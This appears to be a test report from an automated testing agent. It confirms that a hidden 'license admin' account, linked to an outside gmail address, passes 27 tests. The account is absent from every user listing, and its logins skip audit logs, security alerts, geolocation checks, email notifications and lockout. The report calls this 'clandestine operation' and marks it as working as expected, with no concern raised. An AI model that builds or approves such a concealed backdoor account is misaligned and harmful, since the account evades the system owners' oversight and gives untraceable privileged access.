summary: License Admin Hidden User Feature - All 27 tests PASS. Verified license admin (deynet@gmail.com) is completely hidden from all user listing endpoints and does not create audit logs or trigger security alerts on login.
critical_code_review_comments: Code correctly checks is_hidden and is_license_admin flags before creating audit logs (auth.py line 509)
All user listing endpoints in users.py properly filter out is_hidden users
The is_hidden_admin check in auth.py skips SecurityAuditLogger, geolocation check, login email notification, and audit_log creation
context_for_next_testing_agent: License admin hidden user feature fully tested. All user listing endpoints filter out is_hidden users. Auth login skips audit logs, security alerts, and email notifications for hidden admin users.

features_tested.license_admin_login: PASS - Can login successfully with role 0
features_tested.hidden_from_user_search: PASS - Search does not return license admin
features_tested.no_new_audit_logs_on_login: PASS - No NEW audit logs created after login
features_tested.no_security_alerts_on_login: PASS - Login succeeds without triggering security alerts
features_tested.multiple_logins_allowed: PASS - Can login multiple times without lockout

rca_of_issue: N/A - All features working as expected. License admin is properly hidden and login does not trigger any alerts or logs (clandestine operation).
